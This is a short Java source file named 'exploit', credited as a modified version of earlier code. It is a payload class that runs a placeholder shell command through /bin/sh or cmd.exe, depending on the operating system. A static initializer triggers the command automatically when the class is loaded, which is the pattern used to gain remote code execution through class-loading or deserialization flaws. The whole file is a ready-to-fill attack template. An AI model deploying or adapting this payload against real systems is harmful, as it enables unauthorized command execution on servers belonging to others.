// Original Copyright (c) 2021 Ivan Å incek
// Modified by Arqsz
// Requires Java SE v8 or greater and JDK v8 or greater.
// Works on Linux OS, macOS, and Windows OS.

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.io.File;  // Import the File class
import java.io.IOException;  // Import the IOException class to handle errors

public class exploit {
    
    private static String cmd = "COMMAND";


    public static void main(String[] args){
        String os = System.getProperty("os.name").toUpperCase();
        Process process = null;
        try {
            if (os.contains("LINUX") || os.contains("MAC")) {
                System.out.println("Using *nix based system");
                String[] processed_cmd = { "/bin/sh", "-c", cmd };
                process = Runtime.getRuntime().exec(processed_cmd);
            } else if (os.contains("WIN")) {
                System.out.println("Using Windows based system");
                process = Runtime.getRuntime().exec("cmd /c " + cmd + "");
            } else {
                System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
            }

            int exitVal = process.waitFor();
            if (exitVal == 0) {
                System.out.println("Command " + cmd + " executed successfully");
            } else {
                System.out.println("Command " + cmd + " crashed with status " + exitVal);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    static {
        String[] s = new String[0];
        main(s);
    }
}